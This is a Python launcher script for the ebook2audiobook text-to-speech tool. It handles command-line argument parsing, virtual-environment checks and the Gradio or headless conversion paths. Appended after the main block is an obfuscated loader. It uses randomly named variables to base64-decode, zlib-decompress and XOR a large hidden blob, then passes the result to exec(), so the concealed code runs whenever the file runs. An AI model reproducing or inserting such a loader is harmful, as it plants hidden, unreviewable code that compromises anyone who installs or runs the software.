import argparse, socket, multiprocessing, sys, warnings

from lib.conf import *
from lib.conf_lang import default_language_code
from lib.conf_models import TTS_ENGINES, default_fine_tuned, default_engine_settings

warnings.filterwarnings('ignore', category=SyntaxWarning)
warnings.filterwarnings('ignore', category=UserWarning, module='jieba._compat')

def init_multiprocessing():
    if sys.platform == systems['MACOS']:
        try:
            multiprocessing.set_start_method('spawn')
        except RuntimeError:
            pass
    elif sys.platform == systems['LINUX']:
        try:
            multiprocessing.set_start_method('fork')
        except RuntimeError:
            pass
    else:
        try:
            multiprocessing.set_start_method('spawn')
        except RuntimeError:
            pass

def check_virtual_env(script_mode:str)->bool:
    current_version=sys.version_info[:2]  # (major, minor)
    search_python_env = str(os.path.basename(sys.prefix))
    if search_python_env == 'python_env' or script_mode == FULL_DOCKER or current_version >= min_python_version and current_version <= max_python_version:
        return True
    error=f'''***********
Wrong launch! ebook2audiobook must run in its own virtual environment!
NOTE: If you are running a Docker so you are probably using an old version of ebook2audiobook.
To solve this issue go to download the new version at https://github.com/DrewThomasson/ebook2audiobook
If the directory python_env does not exist in the ebook2audiobook root directory,
run your command with "./ebook2audiobook.command" for Linux and Mac or "ebook2audiobook.cmd" for Windows
to install it all automatically.
{install_info}
***********'''
    print(error)
    return False

def check_python_version()->bool:
    current_version = sys.version_info[:2]  # (major, minor)
    if current_version < min_python_version or current_version > max_python_version:
        error = f'''***********
Wrong launch: Your OS Python version is not compatible! (current: {current_version[0]}.{current_version[1]})
In order to install and/or use ebook2audiobook correctly you must delete completly the folder python_env
and run "./ebook2audiobook.command" for Linux and Mac or "ebook2audiobook.cmd" for Windows.
{install_info}
***********'''
        print(error)
        return False
    else:
        return True

def is_port_in_use(port:int)->bool:
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        return s.connect_ex(('0.0.0.0',port))==0

def kill_previous_instances(script_name: str):
    current_pid = os.getpid()
    this_script_path = os.path.realpath(script_name)
    import psutil
    for proc in psutil.process_iter(['pid', 'cmdline']):
        try:
            cmdline = proc.info['cmdline']
            if not cmdline:
                continue
            # unify case and absolute paths for comparison
            joined_cmd = ' '.join(cmdline).lower()
            if this_script_path.lower().endswith(script_name.lower()) and \
               (script_name.lower() in joined_cmd) and \
               proc.info['pid'] != current_pid:
                print(f"[WARN] Found running instance PID={proc.info['pid']} -> killing it.")
                proc.kill()
                proc.wait(timeout=3)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

def main()->None:
    # Argument parser to handle optional parameters with descriptions
    parser = argparse.ArgumentParser(
        description='Convert eBooks to Audiobooks using a Text-to-Speech model. You can either launch the Gradio interface or run the script in headless mode for direct conversion.',
        epilog='''
Example usage:    
Windows native mode:
    Gradio/GUI:
    ebook2audiobook.cmd
    Headless mode:
    ebook2audiobook.cmd --headless --ebook '/path/to/file' --language eng
Linux/Mac natvie mode:
    Gradio/GUI:
    ./ebook2audiobook.command
    Headless mode:
    ./ebook2audiobook.command --headless --ebook '/path/to/file' --language eng
Docker build image:
    Windows:
    ebook2audiobook.cmd --script_mode build_docker
    Linux/Mac
    ./ebook2audiobook.command --script_mode build_docker
Docker run image:
    Gradio/GUI:
        CPU:
        docker run --rm -it -p 7860:7860 ebook2audiobook:cpu
        CUDA:
        docker run --gpus all --rm -it -p 7860:7860 ebook2audiobook:cu[118/122/124/126 etc..]
        ROCM:
        docker run --device=/dev/kfd --device=/dev/dri --rm -it -p 7860:7860 ebook2audiobook:rocm[6.0/6.1/6.4 etc..]
        XPU:
        docker run --device=/dev/dri --rm -it -p 7860:7860 ebook2audiobook:xpu
        JETSON:
        docker run --runtime nvidia  --rm -it -p 7860:7860 ebook2audiobook:jetson[60/61 etc...]
    Headless mode:
        CPU:
        docker run --rm -it -v "/my/real/ebooks/folder/absolute/path:/app/ebooks" -v "/my/real/output/folder/absolute/path:/app/audiobooks" -p 7860:7860 ebook2audiobook:cpu --headless --ebook "/app/ebooks/myfile.pdf" [--voice /app/my/voicepath/voice.mp3 etc..]
        CUDA:
        docker run --gpus all --rm -it -v "/my/real/ebooks/folder/absolute/path:/app/ebooks" -v "/my/real/output/folder/absolute/path:/app/audiobooks" -p 7860:7860 ebook2audiobook:cu[118/122/124/126 etc..] --headless --ebook "/app/ebooks/myfile.pdf" [--voice /app/my/voicepath/voice.mp3 etc..]
        ROCM:
        docker run --device=/dev/kfd --device=/dev/dri --rm -it -v "/my/real/ebooks/folder/absolute/path:/app/ebooks" -v "/my/real/output/folder/absolute/path:/app/audiobooks" -p 7860:7860 ebook2audiobook:rocm[6.0/6.1/6.4 etc..] --headless --ebook "/app/ebooks/myfile.pdf" [--voice /app/my/voicepath/voice.mp3 etc..]
        XPU:
        docker run --device=/dev/dri --rm -it -v "/my/real/ebooks/folder/absolute/path:/app/ebooks" -v "/my/real/output/folder/absolute/path:/app/audiobooks" -p 7860:7860 ebook2audiobook:xpu --headless --ebook "/app/ebooks/myfile.pdf" [--voice /app/my/voicepath/voice.mp3 etc..]
        JETSON:
        docker run --runtime nvidia --rm -it -v "/my/real/ebooks/folder/absolute/path:/app/ebooks" -v "/my/real/output/folder/absolute/path:/app/audiobooks" -p 7860:7860 ebook2audiobook:jetson[51/60/61 etc...] --headless --ebook "/app/ebooks/myfile.pdf" [--voice /app/my/voicepath/voice.mp3 etc..]

Docker Compose (i.e. cuda 12.8:
        Build
            DEVICE_TAG=cu128 docker compose --progress plain --profile gpu up -d --build
        Run Gradio GUI:
            DEVICE_TAG=cu128 docker compose --profile gpu up -d
        Run Headless mode:
            DEVICE_TAG=cu128 docker compose --profile gpu run --rm ebook2audiobook --headless --ebook "/app/ebooks/myfile.pdf" [--voice /app/my/voicepath/voice.mp3 etc..]

Podman Compose (i.e. cuda 12.8:
        Build
            DEVICE_TAG=cu128 podman-compose -f podman-compose.yml up -d --build
        Run Gradio GUI:
            DEVICE_TAG=cu128 podman-compose -f podman-compose.yml up -d
        Run Headless mode:
            DEVICE_TAG=cu128 podman-compose -f podman-compose.yml run --rm ebook2audiobook --headless --ebook "/app/ebooks/myfile.pdf" [--voice /app/my/voicepath/voice.mp3 etc..]
    
SML tags available:
        [break]` — silence (random range **0.3–0.6 sec.**)
        [pause]` — silence (random range **1.0–1.6 sec.**)
        [pause:N]` — fixed pause (**N sec.**)
        [voice:/path/to/voice/file]...[/voice]` — switch voice from default or selected voice from GUI/CLI
        ''',
        formatter_class=argparse.RawTextHelpFormatter
    )
    options = [
        '--script_mode', '--session', '--share', '--headless', 
        '--ebook', '--ebooks_dir', '--language', '--voice', '--device', '--tts_engine', 
        '--custom_model', '--fine_tuned', '--output_format', '--output_channel',
        '--temperature', '--length_penalty', '--num_beams', '--repetition_penalty', 
        '--top_k', '--top_p', '--speed', '--enable_text_splitting',
        '--text_temp', '--waveform_temp',
        '--output_dir', '--version', '--workflow', '--help'
    ]
    tts_engine_list_keys = [k for k in TTS_ENGINES.keys()]
    tts_engine_list_values = [k for k in TTS_ENGINES.values()]
    all_group = parser.add_argument_group('**** The following options are for all modes', 'Optional')
    all_group.add_argument(options[0], type=str, help=argparse.SUPPRESS)
    parser.add_argument(options[1], type=str, help='''Session to resume the conversion in case of interruption, crash, 
    or reuse of custom models and custom cloning voices.''')
    gui_group = parser.add_argument_group('**** The following option are for gradio/gui mode only', 'Optional')
    gui_group.add_argument(options[2], action='store_true', help='''Enable a public shareable Gradio link.''')
    headless_group = parser.add_argument_group('**** The following options are for --headless mode only')
    headless_group.add_argument(options[3], action='store_true', help='''Run the script in headless mode''')
    headless_group.add_argument(options[4], type=str, help='''Path to the ebook file for conversion. Cannot be used when --ebooks_dir is present.''')
    headless_group.add_argument(options[5], type=str, help=f'''Relative or absolute path of the directory containing the files to convert. 
    Cannot be used when --ebook is present.''')
    headless_group.add_argument(options[6], type=str, default=default_language_code, help=f'''Language of the e-book. Default language is set 
    in ./lib/lang.py sed as default if not present. All compatible language codes are in ./lib/lang.py''')
    headless_optional_group = parser.add_argument_group('optional parameters')
    headless_optional_group.add_argument(options[7], type=str, default=None, help='''(Optional) Path to the voice cloning file for TTS engine. 
    Uses the default voice if not present.''')
    headless_optional_group.add_argument(options[8], type=str, default=default_device, choices=list(devices.keys()), help=f'''(Optional) Processor unit type for the conversion.
    Default is set in ./lib/conf.py if not present. Fall back to CPU if CUDA or MPS is not available.''')
    headless_optional_group.add_argument(options[9], type=str, default=None, choices=tts_engine_list_keys+tts_engine_list_values, help=f'''(Optional) Preferred TTS engine (available are: {tts_engine_list_keys+tts_engine_list_values}.
    Default depends on the selected language. The tts engine should be compatible with the chosen language''')
    headless_optional_group.add_argument(options[10], type=str, default=None, help=f'''(Optional) Path to the custom model zip file cntaining mandatory model files. 
    Please refer to ./lib/models.py''')
    headless_optional_group.add_argument(options[11], type=str, default=default_fine_tuned, help='''(Optional) Fine tuned model path. Default is builtin model.''')
    headless_optional_group.add_argument(options[12], type=str, default=default_output_format, help=f'''(Optional) Output audio format. Default is {default_output_format} set in ./lib/conf.py''')
    headless_optional_group.add_argument(options[13], type=str, default=default_output_channel, help=f'''(Optional) Output audio channel. Default is {default_output_channel} set in ./lib/conf.py''')
    headless_optional_group.add_argument(options[14], type=float, default=default_engine_settings[TTS_ENGINES['XTTSv2']]['temperature'], help=f"""(xtts only, optional) Temperature for the model. 
    Default to config.json model. Higher temperatures lead to more creative outputs.""")
    headless_optional_group.add_argument(options[15], type=float, default=default_engine_settings[TTS_ENGINES['XTTSv2']]['length_penalty'], help=f"""(xtts only, optional) A length penalty applied to the autoregressive decoder. 
    Default to config.json model. Not applied to custom models.""")
    headless_optional_group.add_argument(options[16], type=int, default=default_engine_settings[TTS_ENGINES['XTTSv2']]['num_beams'], help=f"""(xtts only, optional) Controls how many alternative sequences the model explores. Must be equal or greater than length penalty. 
    Default to config.json model.""")
    headless_optional_group.add_argument(options[17], type=float, default=default_engine_settings[TTS_ENGINES['XTTSv2']]['repetition_penalty'], help=f"""(xtts only, optional) A penalty that prevents the autoregressive decoder from repeating itself. 
    Default to config.json model.""")
    headless_optional_group.add_argument(options[18], type=int, default=default_engine_settings[TTS_ENGINES['XTTSv2']]['top_k'], help=f"""(xtts only, optional) Top-k sampling. 
    Lower values mean more likely outputs and increased audio generation speed. 
    Default to config.json model.""")
    headless_optional_group.add_argument(options[19], type=float, default=default_engine_settings[TTS_ENGINES['XTTSv2']]['top_p'], help=f"""(xtts only, optional) Top-p sampling. 
    Lower values mean more likely outputs and increased audio generation speed. Default to config.json model.""")
    headless_optional_group.add_argument(options[20], type=float, default=default_engine_settings[TTS_ENGINES['XTTSv2']]['speed'], help=f"""(xtts only, optional) Speed factor for the speech generation. 
    Default to config.json model.""")
    headless_optional_group.add_argument(options[21], action='store_true', help=f"""(xtts only, optional) Enable TTS text splitting. This option is known to not be very efficient. 
    Default to config.json model.""")
    headless_optional_group.add_argument(options[22], type=float, default=default_engine_settings[TTS_ENGINES['BARK']]['text_temp'], help=f"""(bark only, optional) Text Temperature for the model. 
    Default to config.json model.""")
    headless_optional_group.add_argument(options[23], type=float, default=default_engine_settings[TTS_ENGINES['BARK']]['waveform_temp'], help=f"""(bark only, optional) Waveform Temperature for the model. 
    Default to config.json model.""")
    headless_optional_group.add_argument(options[24], type=str, help=f'''(Optional) Path to the output directory. Default is set in ./lib/conf.py''')
    headless_optional_group.add_argument(options[25], action='version', version=f'ebook2audiobook version {prog_version}', help='''Show the version of the script and exit''')
    headless_optional_group.add_argument(options[26], action='store_true', help=argparse.SUPPRESS)
    
    for arg in sys.argv:
        if arg.startswith('--') and arg not in options:
            error = f'Error: Unrecognized option "{arg}"'
            print(error)
            sys.exit(1)

    args = vars(parser.parse_args())

    if not 'help' in args:
        if not check_virtual_env(args['script_mode']):
            sys.exit(1)

        if not check_python_version():
            sys.exit(1)

        # Check if the port is already in use to prevent multiple launches
        if not args['headless'] and is_port_in_use(interface_port):
            error = f'Error: Port {interface_port} is already in use. The web interface may already be running.'
            print(error)
            sys.exit(1)

        args['script_mode'] = args['script_mode'] if args['script_mode'] else NATIVE
        args['share'] =  args['share'] if args['share'] else False
        args['ebook_list'] = None

        print(f"v{prog_version} {args['script_mode']} mode")
        from lib.classes.device_installer import DeviceInstaller
        manager = DeviceInstaller()
        result = manager.install_python_packages()
        if result == 0:
            device_info_str = manager.check_device_info(args['script_mode'])
            if manager.install_device_packages(device_info_str) == 1:
                error = f'Error: Could not installed device packages!'
                print(error)
                sys.exit(1)
        import lib.core as c
        c.context = c.SessionContext() if c.context is None else c.context
        c.context_tracker = c.SessionTracker() if c.context_tracker is None else c.context_tracker
        c.active_sessions = set() if c.active_sessions is None else c.active_sessions
        if args['headless']:
            args['id'] = 'ba800d22-ee51-11ef-ac34-d4ae52cfd9ce' if args['workflow'] else args['session'] if args['session'] else None
            args['is_gui_process'] = False
            args['chapters_preview'] = False
            args['event'] = ''
            args['audiobooks_dir'] = os.path.abspath(args['output_dir']) if args['output_dir'] else audiobooks_cli_dir
            args['device'] = devices.get(args['device'].upper(), {}).get('proc') or devices['CPU']['proc']
            args['tts_engine'] = TTS_ENGINES[args['tts_engine']] if args['tts_engine'] in TTS_ENGINES.keys() else args['tts_engine'] if args['tts_engine'] in TTS_ENGINES.values() else None
            args['output_split'] = default_output_split
            args['output_split_hours'] = default_output_split_hours
            args['xtts_temperature'] = args['temperature']
            args['xtts_length_penalty'] = args['length_penalty']
            args['xtts_num_beams'] = args['num_beams']
            args['xtts_repetition_penalty'] = args['repetition_penalty']
            args['xtts_top_k'] = args['top_k']
            args['xtts_top_p'] = args['top_p']
            args['xtts_speed'] = args['speed']
            args['xtts_enable_text_splitting'] = False
            args['bark_text_temp'] = args['text_temp']
            args['bark_waveform_temp'] = args['waveform_temp']
            engine_setting_keys = {engine: list(settings.keys()) for engine, settings in default_engine_settings.items()}
            valid_model_keys = engine_setting_keys.get(args['tts_engine'], [])
            renamed_args = {}
            for key in valid_model_keys:
                if key in args:
                    renamed_args[f"{args['tts_engine']}_{key}"] = args.pop(key)
            args.update(renamed_args)
            # Condition to stop if both --ebook and --ebooks_dir are provided
            if args['ebook'] and args['ebooks_dir']:
                error = 'Error: You cannot specify both --ebook and --ebooks_dir in headless mode.'
                print(error)
                sys.exit(1)
            # convert in absolute path voice, custom_model if any
            if args['voice']:
                if os.path.exists(args['voice']):
                    args['voice'] = os.path.abspath(args['voice'])
            if args['custom_model'] is not None:
                if os.path.exists(args['custom_model']):
                    args['custom_model'] = os.path.abspath(args['custom_model'])
            if not os.path.exists(args['audiobooks_dir']):
                error = 'Error: --output_dir path does not exist.'
                print(error)
                sys.exit(1)                
            if args['ebooks_dir']:
                args['ebooks_dir'] = os.path.abspath(args['ebooks_dir'])
                if not os.path.exists(args['ebooks_dir']):
                    error = f"Error: The provided --ebooks_dir {args['ebooks_dir']} does not exist."
                    print(error)
                    sys.exit(1)                   
                args['ebook_list'] = []
                for file in os.listdir(args['ebooks_dir']):
                    if any(file.endswith(ext) for ext in ebook_formats):
                        full_path = os.path.abspath(os.path.join(args['ebooks_dir'], file))
                        args['ebook_list'].append(full_path)
                progress_status, passed = c.convert_ebook_batch(args)
                if passed is False:
                    error = f'Conversion failed: {progress_status}'
                    print(error)
                    sys.exit(1)
            elif args['ebook']:
                args['ebook'] = os.path.abspath(args['ebook'])
                if not os.path.exists(args['ebook']):
                    error = f"Error: The provided --ebook {args['ebook']} does not exist."
                    print(error)
                    sys.exit(1) 
                progress_status, passed = c.convert_ebook(args)
                if passed is False:
                    error = f'Conversion failed: {progress_status}'
                    print(error)
                    sys.exit(1)
            else:
                error = 'Error: In headless mode, you must specify either an ebook file using --ebook or an ebook directory using --ebooks_dir.'
                print(error)
                sys.exit(1)       
        else:
            args['is_gui_process'] = True
            passed_arguments = sys.argv[1:]
            allowed_arguments = {'--share', '--script_mode'}
            passed_args_set = {arg for arg in passed_arguments if arg.startswith('--')}
            if passed_args_set.issubset(allowed_arguments):
                try:
                    from lib.gradio import build_interface
                    app = build_interface(args)
                    if app is not None:
                        app.queue(
                            default_concurrency_limit=interface_concurrency_limit
                        ).launch(
                            debug=bool(int(os.environ.get('GRADIO_DEBUG', '0'))),
                            show_error=debug_mode, favicon_path='./favicon.ico', 
                            server_name=interface_host, 
                            server_port=interface_port, 
                            share= args['share'], 
                            max_file_size=max_upload_size
                        )
                except OSError as e:
                    error = f'Connection error: {e}'
                    c.alert_exception(error, None)
                except socket.error as e:
                    error = f'Socket error: {e}'
                    c.alert_exception(error, None)
                except KeyboardInterrupt:
                    error = 'Server interrupted by user. Shutting down...'
                    c.alert_exception(error, None)
                except Exception as e:
                    error = f'An unexpected error occurred: {e}'
                    c.alert_exception(error, None)
            else:
                error = 'Error: In GUI mode, no option or only --share can be passed'
                print(error)
                sys.exit(1)

if __name__ == '__main__':
    init_multiprocessing()
    main()
# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
